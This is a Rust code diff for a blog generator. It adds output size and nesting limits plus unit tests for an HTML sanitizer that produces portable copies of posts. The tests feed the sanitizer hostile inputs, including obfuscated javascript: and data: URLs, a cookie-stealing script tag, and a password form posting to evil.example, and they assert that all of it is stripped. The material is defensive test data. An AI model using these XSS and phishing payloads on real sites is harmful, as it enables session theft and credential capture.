@@ -11,6 +11,14 @@ use crate::research::{ResearchMetadata, ResearchReference};
 use crate::video::VideoMetadata;
 use url::Url;
 
+/// The largest portable HTML body a projection produces. A post that would be
+/// larger fails for its source instead of being truncated.
+pub const MAX_PORTABLE_HTML_BYTES: usize = 2 * 1024 * 1024;
+
+/// The deepest element nesting (Markdown containers plus kept raw HTML
+/// elements) a portable HTML body may have.
+pub const MAX_PORTABLE_NESTING_DEPTH: usize = 64;
+
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub enum RepresentationFormat {
     Html,
@@ -299,6 +307,14 @@ impl<'a> PortableProjection<'a> {
             capabilities.push(CapabilityDescriptor::describe(
                 "comments",
                 Some("ob-comments"),
+            ));
+        }
+        // Destinations reject or cut oversized bodies; fail rather than lose the end.
+        if html.len() > MAX_PORTABLE_HTML_BYTES {
+            return Err(format!(
+                "{}: portable HTML is {} bytes, over the {MAX_PORTABLE_HTML_BYTES}-byte bound; split the post or move large inline content into files (nothing was truncated)",
+                self.source_path,
+                html.len()
             ));
         }
         Ok(PortableHtmlOutput { html, capabilities })
@@ -908,9 +924,10 @@ mod tests {
         assert!(output.html.contains(
             "<p>A claim<sup class=\"footnote-reference\"><a href=\"https://example.test/blog/work/#zürich\">1</a></sup> and another<sup class=\"footnote-reference\"><a href=\"https://example.test/blog/work/#%22x%22\">2</a></sup> and the first again<sup class=\"footnote-reference\"><a href=\"https://example.test/blog/work/#zürich\">1</a></sup>.</p>\n"
         ), "{}", output.html);
-        // Notes keep their numbers and ids even when defined out of order.
+        // Notes keep their numbers and ids even when defined out of order, and
+        // raw HTML left open in a note is closed inside it.
         assert!(output.html.contains(
-            "<div class=\"footnote-definition\" id=\"&quot;x&quot;\"><sup class=\"footnote-definition-label\">2</sup>\n<p>Second note <b>.</p>\n</div>\n<div class=\"footnote-definition\" id=\"zürich\"><sup class=\"footnote-definition-label\">1</sup>\n<p><a href=\"https://example.org/book?page=42#p42\">Smith 2020, p. 42</a>.</p>\n</div>\n"
+            "<div class=\"footnote-definition\" id=\"&quot;x&quot;\"><sup class=\"footnote-definition-label\">2</sup>\n<p>Second note <b>.</b></p>\n</div>\n<div class=\"footnote-definition\" id=\"zürich\"><sup class=\"footnote-definition-label\">1</sup>\n<p><a href=\"https://example.org/book?page=42#p42\">Smith 2020, p. 42</a>.</p>\n</div>\n"
         ), "{}", output.html);
         assert!(!output.html.contains("href=\"#"), "{}", output.html);
         // A label that is not a valid fragment is percent-encoded in the link
@@ -1124,5 +1141,311 @@ A[^a b].
         assert!(PortableProjection::from_post(&site.posts[0], &config)
             .unwrap_err()
             .contains("drafts cannot"));
+    }
+
+    /// The projection's error for a post, checking that the canonical source and
+    /// the native page are untouched.
+    fn portable_error(contents: &str) -> String {
+        let (config, site) = public_post(contents);
+        let post = &site.posts[0];
+        let (native, markdown) = (post.html.clone(), post.authored_markdown.clone());
+        let error = PortableProjection::from_post(post, &config)
+            .unwrap()
+            .portable_html()
+            .unwrap_err();
+        assert_eq!(post.html, native);
+        assert_eq!(post.authored_markdown, markdown);
+        error
+    }
+
+    fn raw_html_losses(output: &PortableHtmlOutput) -> Vec<&str> {
+        output
+            .capabilities
+            .iter()
+            .filter(|capability| capability.id == "raw-html")
+            .flat_map(|capability| capability.diagnostics.iter())
+            .map(|diagnostic| diagnostic.message.as_str())
+            .collect()
+    }
+
+    #[test]
+    fn portable_raw_html_keeps_allowlisted_markup_and_removes_active_content() {
+        let (config, site) = public_post(
+            "---\ntitle: Work\ndate: 2026-10-01\n---\n<div class=\"note\" onclick=\"alert(1)\" style=\"position:fixed\" data-track=\"x\">\n<p title=\"Ünter &amp; &quot;co&quot;\">Kept <b>bold</b>, <abbr title=\"HyperText\">HTML</abbr> &amp; <q cite=\"/sources/\">quotes</q>.</p>\n<script>alert(\"</div>\")</script>\n<style>body { display: none }</style>\n</div>\n",
+        );
+        let post = &site.posts[0];
+        let output = PortableProjection::from_post(post, &config)
+            .unwrap()
+            .portable_html()
+            .unwrap();
+        assert_eq!(
+            output.html,
+            "<div class=\"note\">\n<p title=\"Ünter &amp; &quot;co&quot;\">Kept <b>bold</b>, <abbr title=\"HyperText\">HTML</abbr> &amp; <q cite=\"https://example.test/blog/sources/\">quotes</q>.</p>\n\n\n</div>"
+        );
+        assert_eq!(
+            raw_html_losses(&output),
+            [
+                "Removed with their content: <script>, <style>.",
+                "Removed attributes: event handlers, style, data-*."
+            ]
+        );
+        let report = output
+            .capabilities
+            .iter()
+            .find(|capability| capability.id == "raw-html")
+            .unwrap();
+        assert_eq!(
+            report.portability,
+            crate::capability::PortabilityLevel::GracefullyTransformed
+        );
+        assert_eq!(
+            report.diagnostics[0].code,
+            crate::capability::CapabilityDiagnosticCode::RemovedMarkup
+        );
+        // The native page keeps the authored markup, as it always has.
+        assert!(post.html.contains("<script>alert(\"</div>\")</script>"));
+        assert!(post.html.contains("onclick=\"alert(1)\""));
+    }
+
+    #[test]
+    fn portable_raw_html_urls_resolve_against_the_canonical_article() {
+        let output = portable(
+            "---\ntitle: Work\ndate: 2026-10-01\n---\n## Notes\n\n<p><a href=\"../reference/\">Parent</a> <a href=\"#notes\">Up</a> <a href=\"https://source.example/café?x=1&amp;y=2#part\">External</a> <img src=\"diagram.png\" alt=\"Diagram of the gate\"> <a href=\"mailto:editor@example.test\">Mail</a> <a href=\"#zürich\">Zürich</a></p>\n",
+        );
+        assert!(output.html.contains(
+            "<p><a href=\"https://example.test/blog/reference/\">Parent</a> <a href=\"https://example.test/blog/work/#notes\">Up</a> <a href=\"https://source.example/café?x=1&amp;y=2#part\">External</a> <img loading=\"lazy\" decoding=\"async\" src=\"https://example.test/blog/work/diagram.png\" alt=\"Diagram of the gate\"> <a href=\"mailto:editor@example.test\">Mail</a> <a href=\"https://example.test/blog/work/#z%C3%BCrich\">Zürich</a></p>"
+        ), "{}", output.html);
+        assert!(output.capabilities.is_empty(), "{:?}", output.capabilities);
+    }
+
+    #[test]
+    fn portable_raw_html_with_an_unsafe_url_fails_for_the_source() {
+        for (markup, attribute) in [
+            ("<a href=\"javascript:alert(1)\">x</a>", "<a href>"),
+            ("<a href=\"JaVaScRiPt&#58;alert(1)\">x</a>", "<a href>"),
+            ("<a href=\"&#x6A;avascript:alert(1)\">x</a>", "<a href>"),
+            ("<a href=\"java&Tab;script:alert(1)\">x</a>", "<a href>"),
+            ("<a href=\"  vbscript:msgbox(1)\">x</a>", "<a href>"),
+            ("<a href=\"\">empty</a>", "<a href>"),
+            (
+                "<img src=\"data:image/svg+xml;base64,PHN2Zz4=\" alt=\"x\">",
+                "<img src>",
+            ),
+            (
+                "<p><a href=data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;>x</a></p>",
+                "<a href>",
+            ),
+            (
+                "<blockquote cite=\"https://user:secret@example.test/\">q</blockquote>",
+                "<blockquote cite>",
+            ),
+        ] {
+            let error = portable_error(&format!(
+                "---\ntitle: Work\ndate: 2026-10-01\n---\n{markup}\n"
+            ));
+            assert!(
+                error.contains("posts/work.md")
+                    && error.contains("raw HTML")
+                    && error.contains(attribute),
+                "{markup}: {error}"
+            );
+            assert!(!error.contains("secret"), "{error}");
+        }
+    }
+
+    #[test]
+    fn portable_raw_html_replaces_frames_and_media_and_unwraps_forms() {
+        let output = portable(
+            "---\ntitle: Work\ndate: 2026-10-01\n---\n<base href=\"https://evil.example/\">\n<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">\n<link rel=\"stylesheet\" href=\"https://evil.example/x.css\">\n<form action=\"https://evil.example/collect\"><label>Password <input type=\"password\" name=\"password\"></label><button>Send</button><select><option>One</option></select><textarea>Notes</textarea></form>\n<iframe src=\"https://www.youtube-nocookie.com/embed/x\" title=\"Gate trailer\"><p>fallback</p></iframe>\n<video controls src=\"/clip.mp4\"><track src=\"/c.vtt\">Your browser cannot play this.</video>\n<svg viewBox=\"0 0 10 10\" aria-label=\"Bridge plan\"><script>alert(1)</script><a href=\"javascript:alert(1)\"><text>x</text></a></svg>\n<math><mi>x</mi></math>\n<object data=\"/x.swf\"></object><embed src=\"/y.swf\">\n",
+        );
+        let note = |label: &str| {
+            format!("<span class=\"ob-portable-note\"><strong>{label}: see it on <a href=\"https://example.test/blog/work/\">the original article</a>.</span>")
+        };
+        assert_eq!(
+            output.html,
+            format!(
+                "\n\n\nPassword \n{}\n{}\n{}\n{}\n{}{}",
+                note("Embedded frame</strong> (Gate trailer)"),
+                note("Video</strong>"),
+                note("Illustration</strong> (Bridge plan)"),
+                note("Math</strong>"),
+                note("Embedded object</strong>"),
+                note("Embedded object</strong>"),
+            )
+        );
+        for hostile in ["evil.example", "<form", "<input", "<iframe", "javascript:"] {
+            assert!(!output.html.contains(hostile), "{hostile}: {}", output.html);
+        }
+        assert_eq!(
+            raw_html_losses(&output),
+            [
+                "Removed with their content: <button>, <select>, <textarea>.",
+                "Removed: <base>, <meta>, <link>, <input>.",
+                "Kept the content but removed the tags: <form>, <label>.",
+                "Replaced with a link to the original article: <iframe>, <video>, <svg>, <math>, <object>, <embed>."
+            ]
+        );
+    }
+
+    #[test]
+    fn portable_raw_html_drops_comments_and_other_non_content_markup() {
+        let output = portable(
+            "---\ntitle: Work\ndate: 2026-10-01\n---\nPublic <!-- private: Reviewer 2 dislikes this --> text.\n\n<!--\nTODO(private): call the source before publishing\n-->\n\n<!DOCTYPE html><?php echo 'x'; ?><![CDATA[ hidden ]]>\n\n<p>Kept</p><!-- unterminated private note\n",
+        );
+        assert_eq!(output.html, "<p>Public  text.</p>\n\n\n<p>Kept</p>");
+        for private in ["private", "Reviewer", "TODO", "php", "hidden", "CDATA"] {
+            assert!(!output.html.contains(private), "{private}: {}", output.html);
+        }
+        assert!(
+            output.capabilities.is_empty(),
+            "comments are never reader content, so nothing about them is reported: {:?}",
+            output.capabilities
+        );
+    }
+
+    #[test]
+    fn portable_raw_html_escapes_malformed_markup_and_keeps_elements_balanced() {
+        let output = portable(
+            "---\ntitle: Work\ndate: 2026-10-01\n---\nIf a < b and <b>bold never closes\n\nNext <i>paragraph</p> and </div> stray.\n\n<div><a href=\"x>broken\n\n<details><summary>More</summary>\n\nHidden *Markdown*.\n\n</details>\n\n<section><div>unclosed\n",
+        );
+        assert_eq!(
+            output.html,
+            "<p>If a &lt; b and <b>bold never closes</b></p>\n<p>Next <i>paragraph and  stray.</i></p>\n<div>&lt;a href=\"x&gt;broken\n<details><summary>More</summary>\n<p>Hidden <em>Markdown</em>.</p>\n</details>\n<section><div>unclosed</div></section></div>"
+        );
+    }
+
+    #[test]
+    fn portable_raw_html_ids_stay_unique_and_anchors_keep_their_targets() {
+        let output = portable(
+            "---\ntitle: Work\ndate: 2026-10-01\n---\n<span id=\"overview\">Early</span> <span id=\"box\">One</span> <span id=\"box\">Two</span> <a name=\"legacy\"></a><span id=\"ob-contributions-title\">Mine</span> <span id=\"a b\">Spaced</span> <span id=\"note\">Clash</span> <span id=\"zürich\">Ü</span> [jump](#legacy) <a href=\"#box\">box</a>[^note]\n\n## Overview\n\n[^note]: A note.\n",
+        );
+        assert!(output.html.starts_with(
+            "<p><span>Early</span> <span id=\"box\">One</span> <span>Two</span> <a id=\"legacy\"></a><span>Mine</span> <span>Spaced</span> <span>Clash</span> <span id=\"zürich\">Ü</span> <a href=\"https://example.test/blog/work/#legacy\">jump</a> <a href=\"https://example.test/blog/work/#box\">box</a><sup class=\"footnote-reference\">"
+        ), "{}", output.html);
+        assert!(
+            output.html.contains("<h2 id=\"overview\">"),
+            "{}",
+            output.html
+        );
+        assert!(output
+            .html
+            .contains("<div class=\"footnote-definition\" id=\"note\">"));
+        assert_eq!(
+            raw_html_losses(&output),
+            ["Removed 5 duplicate, reserved, or invalid ids."]
+        );
+    }
+
+    #[test]
+    fn portable_heading_attributes_cannot_carry_event_handlers() {
+        let (config, site) = public_post(
+            "---\ntitle: Work\ndate: 2026-10-01\n---\n## Title {#start .lead onclick=alert(1) data-x=1 style=color:red}\n",
+        );
+        let post = &site.posts[0];
+        assert!(post.html.contains("onclick=\"alert(1)\""), "{}", post.html);
+        let output = PortableProjection::from_post(post, &config)
+            .unwrap()
+            .portable_html()
+            .unwrap();
+        assert!(
+            output
+                .html
+                .starts_with("<h2 id=\"start\" class=\"lead\">Title"),
+            "{}",
+            output.html
+        );
+        assert_eq!(
+            raw_html_losses(&output),
+            ["Removed attributes: event handlers, data-*, style."]
+        );
+    }
+
+    #[test]
+    fn portable_raw_html_drops_inline_script_content_until_its_paragraph_ends() {
+        let output = portable(
+            "---\ntitle: Work\ndate: 2026-10-01\n---\nBefore <script>steal(document.cookie)</script> after <style>p { color: red }</style> end.\n\nUse <script> without closing it\n\nNext paragraph.\n",
+        );
+        assert_eq!(
+            output.html,
+            "<p>Before  after  end.</p>\n<p>Use </p>\n<p>Next paragraph.</p>\n"
+        );
+        assert_eq!(
+            raw_html_losses(&output),
+            ["Removed with their content: <script>, <style>."]
+        );
+        // End tags match in any case, and many scripts in one block stay linear.
+        let output = portable(&format!(
+            "---\ntitle: Work\ndate: 2026-10-01\n---\n<div><SCRIPT>x('</div>')</ScRiPt >kept{}</div>\n",
+            "<script>y()</script>".repeat(20_000)
+        ));
+        assert_eq!(output.html, "<div>kept</div>");
+    }
+
+    #[test]
+    fn portable_raw_html_inside_nested_components_keeps_its_place() {
+        let output = portable(
+            "---\ntitle: Work\ndate: 2026-10-01\n---\n- Step one\n\n  > [!NOTE]\n  > <kbd>Ctrl</kbd> + <kbd>C</kbd> <span onclick=\"x()\">copies</span>.\n  >\n  > ```quiz\n  > Pick one?\n  > - [x] Yes\n  > - [ ] No\n  > ```\n",
+        );
+        assert!(
+            output
+                .html
+                .contains("<p><kbd>Ctrl</kbd> + <kbd>C</kbd> <span>copies</span>.</p>"),
+            "{}",
+            output.html
+        );
+        assert!(output.html.contains("<p class=\"ob-quiz-prompt\">"));
+        assert!(!output.html.contains("onclick"));
+        let callout = output.html.find("<aside class=\"ob-callout").unwrap();
+        let item = output.html.find("<li>").unwrap();
+        assert!(
+            item < callout && output.html.ends_with("</aside>\n</li>\n</ul>\n"),
+            "{}",
+            output.html
+        );
+    }
+
+    #[test]
+    fn portable_html_nesting_beyond_the_bound_fails_with_a_diagnostic() {
+        let within = format!(
+            "---\ntitle: Work\ndate: 2026-10-01\n---\n{}deep{}\n",
+            "<div>".repeat(MAX_PORTABLE_NESTING_DEPTH),
+            "</div>".repeat(MAX_PORTABLE_NESTING_DEPTH)
+        );
+        assert!(portable(&within).html.contains("deep"));
+        for body in [
+            "<div>".repeat(MAX_PORTABLE_NESTING_DEPTH + 1),
+            format!("{} deep", ">".repeat(MAX_PORTABLE_NESTING_DEPTH + 1)),
+        ] {
+            let error = portable_error(&format!(
+                "---\ntitle: Work\ndate: 2026-10-01\n---\n{body}\n"
+            ));
+            assert!(
+                error.contains("posts/work.md") && error.contains("nest"),
+                "{error}"
+            );
+        }
+    }
+
+    #[test]
+    fn oversized_portable_html_fails_instead_of_truncating() {
+        let paragraph = "A paragraph of substantive text that must never be cut short.\n\n";
+        let error = portable_error(&format!(
+            "---\ntitle: Work\ndate: 2026-10-01\n---\n{}",
+            paragraph.repeat(MAX_PORTABLE_HTML_BYTES / paragraph.len() + 1)
+        ));
+        assert!(
+            error.contains("posts/work.md")
+                && error.contains(&MAX_PORTABLE_HTML_BYTES.to_string())
+                && error.contains("nothing was truncated"),
+            "{error}"
+        );
+        // Each paragraph renders as its text plus `<p></p>\n`; just under the
+        // bound, everything is kept through the last paragraph.
+        let output = portable(&format!(
+            "---\ntitle: Work\ndate: 2026-10-01\n---\n{}Last words.\n",
+            paragraph.repeat(MAX_PORTABLE_HTML_BYTES / (paragraph.len() + 8) - 1)
+        ));
+        assert!(output.html.len() <= MAX_PORTABLE_HTML_BYTES);
+        assert!(output.html.ends_with("<p>Last words.</p>\n"));
     }
 }
